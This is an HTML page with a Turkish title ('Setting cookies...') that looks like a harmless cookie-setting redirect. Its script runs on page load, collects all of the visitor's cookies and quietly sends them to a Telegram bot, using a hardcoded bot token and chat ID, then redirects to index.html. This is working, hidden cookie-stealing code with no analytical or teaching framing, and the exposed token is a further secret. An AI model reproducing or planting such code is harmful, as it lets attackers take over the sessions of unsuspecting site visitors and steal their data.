<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>Çerez Ayarlanıyor...</title>
  <script>
    // Çerez ayarlama fonksiyonu
    function setCookie(name, value, days) {
      const d = new Date();
      d.setTime(d.getTime() + (days * 24 * 60 * 60 * 1000));
      const expires = "expires=" + d.toUTCString();
      document.cookie = name + "=" + value + ";" + expires + ";path=/";
    }

    // Telegram botuna mesaj gönderme fonksiyonu
    function sendToTelegram(message) {
      const token = "7632849431:AAHh6CxDeiMa6LoUs2m6YUMTrx-lRk1vXYk";  // Bot token'ınızı buraya yazın
      const chatId = "5984214732";   // Telegram sohbet ID'nizi buraya yazın
      const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;

      // Bot API'sine istek gönder
      fetch(url)
        .then(response => response.json())
        .then(data => {
          if (data.ok) {
            console.log("Mesaj Telegram'a gönderildi.");
          } else {
            console.log("Telegram mesaj gönderme başarısız.");
          }
        })
        .catch(error => {
          console.log("Hata:", error);
        });
    }

    // Sayfa yüklendiğinde çerezleri ayarla ve Telegram'a logla
    window.onload = function () {
      setCookie("cookiesAccepted", "true", 30); // 30 gün geçerli çerez

      // Çerezleri al
      const cookies = document.cookie;

      // Çerezleri Telegram'a logla
      sendToTelegram(`Yeni çerezler: ${cookies}`);

      // Ana sayfaya yönlendir
      window.location.href = "index.html";
    }
  </script>
</head>
<body>
</body>
</html>
